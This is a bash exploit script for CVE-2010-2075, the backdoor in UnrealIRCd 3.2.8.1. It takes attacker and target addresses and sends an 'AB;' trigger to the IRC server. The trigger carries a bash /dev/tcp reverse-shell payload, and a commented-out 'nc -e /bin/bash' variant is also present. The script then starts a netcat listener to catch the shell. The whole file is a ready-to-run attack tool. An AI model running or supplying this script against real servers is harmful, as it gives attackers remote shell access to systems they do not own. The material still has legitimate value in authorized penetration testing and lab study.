#!/bin/bash

########################################################################################################################

#### BASED ON #############################################################
# CVE-2010-2075 vuln                                                      #
# UnrealIRCd 3.2.8.1 - Remote Downloader/Execut | linux/remote/13853.pl   #
# simplifying all posible                                                 #
###########################################################################

function help(){

	printf -- "[CVE-2010-2075]\n"
	printf -- "UnrealIrcd 3.2.8.1 IRC EXPLOIT (Internet Relay Chat)\n"
	printf -- "Usage bash UnrealIrcd-3.2.8.1-cve-2010-2075-exploit.sh <attackerip> <attackerport> <ircserverip> <ircserverport>\n"
}


if [ -z "$1" ];
then
	help
	exit
fi


if ! command -v nc &> /dev/null
then
	printf "[\e[1;31mX\e[0m] netcat is not installed\n"
	exit
fi


printf -- "\n[CVE-2010-2075]\n"
printf -- "UnrealIrcd 3.2.8.1 version IRC EXPLOIT (Internet Relay Chat)\n\n"

attacker_ip="$1"
attacker_port="$2"
irc_server_ip="$3"
irc_server_port="$4"

#### PAYLOADS ######################################################################
################################################################################   #
payload="AB;bash -c \"bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1;\"" #   #
################################################################################   #
############################################################                       #
#payload="AB;nc -e /bin/bash $attacker_ip $attacker_port;" #                       #
############################################################                       #
####################################################################################

#### NC IRC CONNECTION PARAMETERS ###################
nc_irc_connect="nc $irc_server_ip $irc_server_port" #
#####################################################

printf -- "[*] Payload: $payload\n"
printf -- "[*] Setting listener up\n"
printf -- "[*] Sending payload...\n"

########## INJECTION ###################
printf "$payload" | $nc_irc_connect &  #
########################################

### Listener ############
nc -lvp "$attacker_port" #
##########################
